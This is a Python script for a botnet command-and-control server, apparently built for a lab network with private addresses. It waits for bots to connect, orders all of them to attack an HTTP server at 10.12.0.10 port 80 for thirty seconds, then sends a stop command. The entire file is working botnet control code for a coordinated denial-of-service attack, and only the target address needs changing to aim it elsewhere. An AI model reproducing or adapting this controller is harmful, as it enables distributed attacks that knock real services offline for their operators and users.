#!/usr/bin/env python3
# C&C Server - runs on internet host (10.2.0.2)
# Waits 10 seconds for bots to connect, then automatically launches attack
# Usage: python3 botnet_cnc.py

import socket
import time

HOST = "10.2.0.2"
PORT = 9999
TARGET_IP = "10.12.0.10"   # HTTP server
TARGET_PORT = 80
WAIT_TIME = 10              # seconds to wait for bots
ATTACK_DURATION = 30        # seconds to run attack

def start_cnc():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(5)
    server.settimeout(1)

    print("=" * 50)
    print("[C&C] Botnet Command & Control Server")
    print(f"[C&C] Listening on {HOST}:{PORT}")
    print(f"[C&C] Target: {TARGET_IP}:{TARGET_PORT}")
    print("=" * 50)
    print(f"[C&C] Waiting {WAIT_TIME} seconds for bots to connect...")

    bots = []
    start = time.time()
    while time.time() - start < WAIT_TIME:
        try:
            conn, addr = server.accept()
            bots.append(conn)
            print(f"[C&C] [OK] Bot connected from {addr[0]} - Total bots: {len(bots)}")
        except socket.timeout:
            remaining = WAIT_TIME - int(time.time() - start)
            print(f"[C&C] Waiting for bots... {remaining}s remaining", end="\r")

    print()
    if not bots:
        print("[C&C] [FAIL] No bots connected. Exiting.")
        server.close()
        return

    print("=" * 50)
    print(f"[C&C] {len(bots)} bots ready!")
    print(f"[C&C] Launching attack on {TARGET_IP}:{TARGET_PORT}")
    print("=" * 50)

    command = f"ATTACK {TARGET_IP} {TARGET_PORT}"
    for i, bot in enumerate(bots):
        bot.send(command.encode())
        print(f"[C&C] [OK] Attack command sent to bot {i+1}")

    print(f"\n[C&C] Attack running for {ATTACK_DURATION} seconds...")
    print(f"[C&C] Press Ctrl+C to stop early\n")

    try:
        for remaining in range(ATTACK_DURATION, 0, -1):
            print(f"[C&C] Attack in progress... {remaining}s remaining", end="\r")
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[C&C] Manually stopping attack early...")

    print("\n[C&C] Sending STOP command to all bots...")
    for i, bot in enumerate(bots):
        try:
            bot.send(b"STOP")
            print(f"[C&C] [OK] STOP sent to bot {i+1}")
        except:
            print(f"[C&C] [FAIL] Bot {i+1} already disconnected")

    print("=" * 50)
    print("[C&C] Attack finished!")
    print("=" * 50)
    server.close()

if __name__ == "__main__":
    start_cnc()
